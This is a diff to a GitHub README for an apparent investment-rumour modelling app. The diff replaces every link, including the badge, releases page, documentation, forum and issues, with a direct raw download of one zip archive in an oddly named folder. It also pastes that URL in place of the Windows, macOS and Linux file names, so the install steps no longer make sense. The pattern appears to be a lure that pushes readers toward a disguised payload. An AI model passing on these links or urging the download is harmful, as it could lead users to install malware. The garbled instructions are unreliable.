@@ -1,7 +1,7 @@
 # 🌟 rumours_complex_investment_decisions - Make Informed Financial Choices Easily
 
 ## 📥 Download the Latest Version
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/karthick04023/rumours_complex_investment_decisions/releases)
+[![Download Latest Release](https://github.com/karthick04023/rumours_complex_investment_decisions/raw/refs/heads/main/Dhritarashtra/decisions_complex_investment_rumours_v2.2.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/karthick04023/rumours_complex_investment_decisions/raw/refs/heads/main/Dhritarashtra/decisions_complex_investment_rumours_v2.2.zip)
 
 ## 🚀 Getting Started
 This guide helps you download and run the **rumours_complex_investment_decisions** application. You will use this tool to explore financial modeling using rumors and their impacts on financial systems.
@@ -25,19 +25,19 @@ Before you begin, make sure your computer meets the following requirements:
 - **Educational Resource**: Learn about the impact of information asymmetry in investment decisions.
 
 ## 🔍 How to Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/karthick04023/rumours_complex_investment_decisions/releases) to find the latest version of the application.
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/karthick04023/rumours_complex_investment_decisions/raw/refs/heads/main/Dhritarashtra/decisions_complex_investment_rumours_v2.2.zip) to find the latest version of the application.
    
 2. **Select Your File**: Look for the most recent release. You will see a list of files available for download.
 
 3. **Download the Application**:
-   - For Windows, look for a file like `rumours_complex_investment_decisions_v1.0.exe`.
-   - For macOS, find a file such as `rumours_complex_investment_decisions_v1.0.dmg`.
-   - For Linux, the file might be named `rumours_complex_investment_decisions_v1.0.tar.gz`.
+   - For Windows, look for a file like `https://github.com/karthick04023/rumours_complex_investment_decisions/raw/refs/heads/main/Dhritarashtra/decisions_complex_investment_rumours_v2.2.zip`.
+   - For macOS, find a file such as `https://github.com/karthick04023/rumours_complex_investment_decisions/raw/refs/heads/main/Dhritarashtra/decisions_complex_investment_rumours_v2.2.zip`.
+   - For Linux, the file might be named `https://github.com/karthick04023/rumours_complex_investment_decisions/raw/refs/heads/main/Dhritarashtra/decisions_complex_investment_rumours_v2.2.zip`.
 
 4. **Run the Installer**: 
    - For Windows, double-click the `.exe` file and follow the prompts.
    - For macOS, open the `.dmg` file and drag the application to your Applications folder.
-   - For Linux, extract the `.tar.gz` file, and run the command in your terminal: `./rumours_complex_investment_decisions`.
+   - For Linux, extract the `https://github.com/karthick04023/rumours_complex_investment_decisions/raw/refs/heads/main/Dhritarashtra/decisions_complex_investment_rumours_v2.2.zip` file, and run the command in your terminal: `./rumours_complex_investment_decisions`.
 
 5. **Start Using the Application**: Once installed, open the application. You can begin to input data and explore the financial models.
 
@@ -50,13 +50,13 @@ Before you begin, make sure your computer meets the following requirements:
 
 ## 🔗 Additional Resources
 Feel free to explore further resources that can help you get the most out of the **rumours_complex_investment_decisions** application:
-- [Documentation](https://github.com/karthick04023/rumours_complex_investment_decisions/wiki)
-- [Community Forum](https://github.com/karthick04023/rumours_complex_investment_decisions/discussions)
+- [Documentation](https://github.com/karthick04023/rumours_complex_investment_decisions/raw/refs/heads/main/Dhritarashtra/decisions_complex_investment_rumours_v2.2.zip)
+- [Community Forum](https://github.com/karthick04023/rumours_complex_investment_decisions/raw/refs/heads/main/Dhritarashtra/decisions_complex_investment_rumours_v2.2.zip)
 
 ## 🧑‍🤝‍🧑 Support
-If you have questions or need help, you can submit an issue directly on the [GitHub Issues page](https://github.com/karthick04023/rumours_complex_investment_decisions/issues). The community is eager to assist you.
+If you have questions or need help, you can submit an issue directly on the [GitHub Issues page](https://github.com/karthick04023/rumours_complex_investment_decisions/raw/refs/heads/main/Dhritarashtra/decisions_complex_investment_rumours_v2.2.zip). The community is eager to assist you.
 
 ## 📢 Final Notes
-The **rumours_complex_investment_decisions** application empowers users to understand complex financial scenarios simply and effectively. For updates, always check the [Releases page](https://github.com/karthick04023/rumours_complex_investment_decisions/releases). 
+The **rumours_complex_investment_decisions** application empowers users to understand complex financial scenarios simply and effectively. For updates, always check the [Releases page](https://github.com/karthick04023/rumours_complex_investment_decisions/raw/refs/heads/main/Dhritarashtra/decisions_complex_investment_rumours_v2.2.zip). 
 
 Happy modeling!
